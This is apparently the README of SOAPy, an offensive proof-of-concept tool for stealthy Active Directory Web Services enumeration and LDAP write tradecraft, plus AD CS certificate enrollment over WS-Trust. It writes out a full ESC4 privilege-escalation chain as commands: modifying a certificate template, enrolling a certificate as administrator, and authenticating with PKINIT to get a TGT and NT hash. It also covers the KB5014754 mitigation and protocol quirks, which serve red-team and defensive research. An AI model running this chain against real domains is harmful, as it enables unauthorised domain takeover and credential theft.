
> [!NOTE]
> Please see the SOAPy Wiki for installation and operational guidance: https://github.com/logangoins/SOAPy/wiki 

# Description
SOAPy is a Proof of Concept (PoC) utility for conducting offensive interaction with Active Directory Web Services (ADWS) through a SOCKS5 proxy.

SOAPy includes previously undeveloped custom python implementations of a collection of Microsoft protocols required for interaction with the ADWS service. This includes but is not limited to: NNS (.NET NegotiateStream Protocol), NMF (.NET Message Framing Protocol), and NBFSE (.NET Binary Format: SOAP Extension). 

SOAPy started as a [research project at IBM X-Force Red with Jackson Leverett](https://www.ibm.com/think/x-force/stealthy-enumeration-of-active-directory-environments-through-adws) to rewrite the proprietary Microsoft .NET mechanisms/library that [FalconForce’s SOAPHound](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/) uses to interact with ADWS, so recon and post-exploitation operations would be possible through a SOCKS5 proxy from Linux on Red Team assessments. After joining [SpecterOps](https://specterops.io), I decided to continue development on the project to bring it up to operational speed. 

SOAPy is used for interacting with ADWS over a proxy for stealthy recon into an internal Active Directory environment. SOAPy is intended to be used as an ADWS ingestor for Active Directory, then the resultant data can be transformed to [BloodHound](https://specterops.io/bloodhound-community-edition/) compatible JSON using [Matt Creel’s BOFHound project](https://github.com/coffeegist/bofhound). The JSON transformed from BOFHound can then be uploaded into BloodHound for post-processing and visualization of attack paths.

SOAPy can also perform targeted post-exploitation operations in Active Directory, useful in many assessments when evasive LDAP write operations are required.

This includes the following tradecraft:

1. servicePrincipalName writing for targeted kerberoasting
2. userAccountControl writing for targeted AS-REProasting
3. msDs-AllowedToActOnBehalfOfOtherIdentity writing for Resource-Based Constrained Delegation (RBCD) attacks
4. msDs-KeyCredentialLink writing for Shadow Credentials attacks
5. DNS record additions for authentication coercion primitives

The protocol structure for interacting with ADWS is shown below:
<img width="1376" height="768" alt="ADWS Protocol Diagram" src="https://github.com/user-attachments/assets/78442899-2e6c-4f72-97c4-ef0d68cf0b3b" />

The blog detailing the original research largely from an engineering perspective can be found here:

[SOAPy: Stealthy enumeration of Active Directory environments through ADWS - IBM X-Force Red](https://www.ibm.com/think/x-force/stealthy-enumeration-of-active-directory-environments-through-adws)

A SpecterOps blog detailing new and modern operational guidance for ADWS tradecraft with SOAPy can be found here: 

[Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS - SpecterOps](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws)



# Certificate enrollment via WS-Trust (MS-WSTEP)

SOAPy ships two primitives for AD CS certificate enrollment entirely over SOAP:

- `--list-policies-ws` — call MS-XCEP `GetPolicies` against the CEP endpoint and print the templates, their OIDs and the CA bundle visible to the authenticated user.
- `--enroll-ws` — call MS-WSTEP `RequestSecurityToken` against the CES endpoint and write the issued certificate + private key out as a PKCS#12 file.

Together they close full-SOAP attack chains (ESC1, ESC4, …) end to end: ADWS over `net.tcp:9389` for the LDAP write side, HTTPS/443 WS-Trust for policy discovery and enrollment. No DCOM, no MS-WCCE, no RPC endpoint mapper.

Invoke SOAPy as a Python module (`python -m src.soa …`) when running from a dev checkout; the `python src/soa.py` form fails on `from src.X` imports because the repository root is not on `sys.path`.

## Prerequisites on the target CA

CES and CEP are not installed by default with an Enterprise CA. They need a valid IIS SSL certificate — `-SSLCertThumbprint $null` is rejected on current builds, you have to point at a real cert in `Cert:\LocalMachine\My`. If `WSEnrollmentServer` crashes at pool start under a custom identity, drop it back to `NetworkService`.

```powershell
# Issue a self-signed cert for IIS to serve CEP/CES on
$cert = New-SelfSignedCertificate -DnsName "<dc.fqdn>","<DC>" `
    -CertStoreLocation Cert:\LocalMachine\My
$thumb = $cert.Thumbprint

Install-WindowsFeature ADCS-Enroll-Web-Pol -IncludeManagementTools
Install-AdcsEnrollmentPolicyWebService `
    -AuthenticationType Kerberos -SSLCertThumbprint $thumb -Force

Install-WindowsFeature ADCS-Enroll-Web-Svc -IncludeManagementTools
Install-AdcsEnrollmentWebService `
    -AuthenticationType Kerberos -CAConfig "<DC>\<CA>" `
    -SSLCertThumbprint $thumb -Force
```

The two IIS applications end up at
`https://<dc.fqdn>/ADPolicyProvider_CEP_Kerberos/service.svc/CEP` and
`https://<dc.fqdn>/<CA>_CES_Kerberos/service.svc/CES` respectively. SOAPy derives both from `--ca <CA>` + the connection string's DC hostname when `--cep-url`/`--ces-url` are not given explicitly.

On the operator box: a valid Kerberos ccache (`klist` shows a TGT) and `requests-gssapi` installed. The code falls back to `requests-kerberos` if gssapi is missing; both are declared in `pyproject.toml`.

## Usage

Both primitives need `--insecure-ssl` as long as the CES/CEP cert is a self-signed IIS one that is not in the operator's trust store.

```bash
# Discover templates, OIDs and the CA bundle
python -m src.soa 'jjk.local/yuji:P@ssword!@dc-curse.jjk.local' \
    --list-policies-ws --ca jjk-CA --insecure-ssl

# Enroll yuji for the standard User template
python -m src.soa 'jjk.local/yuji:P@ssword!@dc-curse.jjk.local' \
    --enroll-ws --ca jjk-CA --template User \
    --upn yuji@jjk.local --out /tmp/yuji-user.pfx --insecure-ssl
```

The output PFX is written with mode 0600 and no password, so it is directly consumable by `certipy auth`, `kinit -t`, `gssapi`, or any PKINIT client.

Enable `--debug` to dump the raw SOAP request and response bodies at `DEBUG` log level — critical when a template or CA policy change starts emitting unfamiliar WCF faults.

## ESC4 attack chain, full-SOAP

The enrollment primitive composes with the pre-existing `--set-attribute` ADWS write primitive. The whole chain stays on `net.tcp:9389` (ADWS) and `tcp/443` (HTTPS WS-Trust) — PKINIT itself is left to standard impacket/certipy:

```bash
# 1. Flip CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT on the vulnerable template (ADWS)
python -m src.soa 'jjk.local/yuji:P@ssword!@dc-curse.jjk.local' --set-attribute \
    --target-dn "CN=ESC4Test,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=jjk,DC=local" \
    --attribute "msPKI-Certificate-Name-Flag" --attr-value "1"

# 2. Enroll a cert for administrator via MS-WSTEP (HTTPS WS-Trust)
python -m src.soa 'jjk.local/yuji:P@ssword!@dc-curse.jjk.local' \
    --enroll-ws --ca jjk-CA --template ESC4Test \
    --upn administrator@jjk.local --out /tmp/admin.pfx --insecure-ssl

# 3. PKINIT with the issued PFX — left to certipy / standard tooling
certipy auth -pfx /tmp/admin.pfx -dc-ip 192.168.56.101
```

The enrollment primitive is SOAPy's; PKINIT is left to standard impacket/certipy.

## KB5014754 StrongCertificateBindingEnforcement

Microsoft's KB5014754 mitigation blocks the final PKINIT step by requiring the CA to inject a Security Extension SID (OID `1.3.6.1.4.1.311.25.2`) matching the requestor, and by having the KDC refuse any PKINIT cert whose SID extension does not match the resolved principal.

Empirical observation on Windows Server 2025 build 26100 (October 2026): the mitigation is **template-dependent**. If the target template does not carry `CT_FLAG_INCLUDE_SID_EXTENSION` in `msPKI-Enrollment-Flag`, the CA emits a certificate without any SID extension, and the KDC — when running the default `StrongCertificateBindingEnforcement = 1` (Compatibility Mode) — falls back to SAN UPN matching. The chain above then yields a TGT for administrator and the ability to extract the NT hash. Both `--enroll-ws` and `certipy req` reproduce this behavior identically against the same template: this is a CA/policy state, not a SOAPy-specific weakness.

To exercise the full mitigation path, either flip the template to include the SID extension flag, pick a template that already has it (e.g. the stock `User` template), or raise the DC's `StrongCertificateBindingEnforcement` to `2` (Full Enforcement). In Full Enforcement the KDC returns `KDC_ERR_CLIENT_NAME_MISMATCH` and PKINIT fails cleanly.

## Deviations from MS-WSTEP spec observed empirically against Windows Server 2025 CES

Tested against Windows Server 2025 build 26100 with a `jjk-CA` Enterprise CA, October 2026. The elements below were sent in their canonical form (per MS-WSTEP, WS-Trust 1.3 and the WSS X.509 Token Profile) and rejected; the "Observed" column is what WCF actually accepts on this build.

| Element | Specification value | Observed value on Windows Server 2025 CES | WCF error on spec value |
| --- | --- | --- | --- |
| HTTPS Negotiate token | SPNEGO AP-REQ alone | SPNEGO AP-REQ + `tls-server-end-point` Channel Binding Token (RFC 5929, SHA-256 of the server certificate DER) | HTTP 401 Unauthorized, no body hint |
| `wsa:Action` | `http://docs.oasis-open.org/ws-sx/ws-trust/200512/RST/Issue` | `http://schemas.microsoft.com/windows/pki/2009/01/enrollment/RST/wstep` | SOAP Fault: "The action is invalid." |
| `wst:TokenType` | `http://schemas.microsoft.com/5.0.0.0/ConfigurationServices/Enrollments/ClientCertificateEnrollment.wsdl` | `http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-x509-token-profile-1.0#X509v3` | SOAP Fault: "The Token Type is invalid." |
| `wsse:BinarySecurityToken` `EncodingType` | `http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-soap-message-security-1.0#Base64Binary` | `http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd#Base64Binary` | SOAP Fault: "The EncodingType is invalid." |
| `wsse:BinarySecurityToken` `ValueType` | `http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-x509-token-profile-1.0#PKCS10` | `http://schemas.microsoft.com/windows/pki/2009/01/enrollment#PKCS10` | SOAP Fault: "The ValueType of BinarySecurityToken is invalid." |
| CSR extensions | `SubjectAlternativeName(otherName=UPN)` + `ExtendedKeyUsage(ClientAuth)` only | Same, plus `szOID_ENROLL_CERTTYPE_EXTENSION` (OID `1.3.6.1.4.1.311.20.2`) carrying the template short name as a DER `BMPString` | CA Policy Module `0x80094801`: "The request does not contain a certificate template extension or the CertificateTemplate request attribute." |
| `<ac:AdditionalContext>` in RST body | Present, with `ContextItem` entries `templateID=<OID>` and `cdp=0` | **Omitted entirely** when the Certificate Template Name extension is already carried in the CSR | SOAP Fault: "The attributes are invalid." (`ErrorCode -2147024809` = `E_INVALIDARG`) |

The CSR-side Certificate Template Name extension carries all the routing information the CA policy module needs; the SOAP-level `AdditionalContext` is only accepted if the CSR itself does not carry a template identifier, and it conflicts with the CSR extension on this build.
